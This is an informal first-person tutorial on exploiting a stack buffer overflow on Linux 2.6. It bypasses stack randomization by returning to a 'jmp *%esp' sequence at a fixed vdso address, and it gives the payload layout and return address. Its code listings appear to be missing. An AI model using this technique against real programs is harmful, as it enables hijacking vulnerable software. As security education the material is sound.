Returning to %esp (Circumventing the VA kernel patch For Fun and Profit)
By phetips [at] gmail.com on a linux/x86 platform.

After reading quite a few papers on stack based buffer overflow exploiting I hadn't managed to exploit a single
stack based buffer overflow myself. I got quite frustrated and even decided to give up (on more than one occasion).
In a weird kind of inspirational mood I was determined to figure it out, but didn't. I was lazy and wasn't sure 
why exactly I couldn't even replicate what the papers showed me. Ah well I guess we can't all be 1337.

I was lucky to have two kind Dutch hackers help me out though, twan from HDNL and eSDee from netric, and now I finally
managed to exploit a simple example stack based buffer overflow vulnerability. You might be thinking "Why would I care 
about that?" at this point... Well how the fuck am I supposed to know; you're reading this crap, aren't you?

It's time for some technical details.

The reason of my frustrating failures in trying to exploit a stack based buffer overflow vulnerability was that I was (still am)
using a 2.6.x linux kernel. Our dear open-source friends decided to make buffer overflow exploiting a bit harder in the 2.6 kernels
by applying their so-called VA patch. The effects of this patch can be seen by running 'cat /proc/self/maps' a couple of times:

The stack has a different starting address every time the program is run. So why is this a problem?

In oldskool stack based buffer overflow exploiting (before the VA patch), you would place your shellcode in your overflowable
buffer (there are other ways to do this, but let's just stick with this for a second) and try to 'guess' the right address
for your shellcode so you know what to overwrite the saved EIP with. If this doesn't make sense to you, you should read Smashing 
the Stack for Fun and Profit by Aleph One.

So how is this address guessed? Well, in linux kernels without the VA patch enabled the stack always starts at the same address. 
So it was just a matter of guessing the right offset from the stack pointer (%esp) to your shellcode. Again, I might not be very 
clear about this: go read Aleph One's paper if this doesn't make sense to you. This method of guessing the right offset is clearly 
not possible on 2.6 kernels because of the randomization of the stack address. Now how do we solve this problem?

You might have noticed the [vdso] in the output of cat /proc/self/maps and you might've even noticed that it's address is static: 
it's the same every time we execute cat. We're going to use this fact to exploit our stack based buffer overflow vulnerability using my 
2.6.15-27-386 linux kernel. "What stack based buffer overflow vulnerability?"; right, time to create one:

So, we've got our 20-bytes long buffer, 4 bytes for the saved stack pointer (note the 0x61's in %ebp) and then 4 bytes for our 
saved %eip. So what the hell do we want in %eip anyways? We want the address of our shellcode in %eip! But since the VA patch 
doesn't want us to know that address, we're going to have to get the address from somewhere else. 

Think about it; we need to know where the vulnerable app's stack is, but we can't find out. The program itself knows where 
the stack is though (it has it's %esp), so if we could make the vulnerable program itself jump to %esp and make sure our shellcode 
is at %esp we would have owned the app. So we should overwrite %eip with the address of a memory location which contains the 
opcodes for jmp *%esp (call *%esp will do just fine too).

Remember the [vdso] thingy that /proc/self/maps told us about? Now what exactly is it? It's linux-gate.so.1: a virtual dynamically 
shared object which is put in a process's virtual memory by the kernel, at a static address . What it's meant for exactly isn't 
really important to us, what's more important is that it's address is static. It's a good place to look for our jmp *%esp opcodes! 
Let's go.

We found our jmp *%esp instruction! Note that this is not actually a jmp *%esp instruction, it is just data that when interpreted as 
instructions happens to be a jmp *%esp instruction. C'mon, what sane application would jmp to %esp? (hihi.)

So we overwrite the saved EIP with the address of the jmp *%esp opcodes (0xffffe777) and thus make the vulnerable program jump to %esp. 
So where do we want our shellcode to be? At the bottom of the stack (at %esp)! DuhhhhhhhhhhH!1111!111. Let's have a look at what our 
dear vulnerable app's stack looks like after the call to strcpy.

Okay, so right after the call to strcpy we see some crap on the top of the stack, then our string, then the saved ebp (which is 
overwritten with 0x41414141) and then the saved %eip. What happens if the program continues?

_______________________________

The last thing the program does before returning to the jmp *%esp instruction is executing the leave instruction.
This instruction pops the saved ebp back into %ebp and sets %esp back to point to point to our saved %eip. The next instruction is RET,
which will pop the value we've overwritten the saved eip with into %eip. The program now tries to jump to %esp. We've just seen that 
%eip now points to right after the saved EIP. This is were we want our shellcode!

See? I put the buffer and the saved stack pointer full with \x41 (print "\x41" x 24), overwritten the saved eip
with the address to the jmp *%esp instruction ("\x77\xe7\xff\xff") and put my shellcode right after the saved eip so %esp
will point to it when the app returns to our lovely jmp *%esp instruction.

Yay.
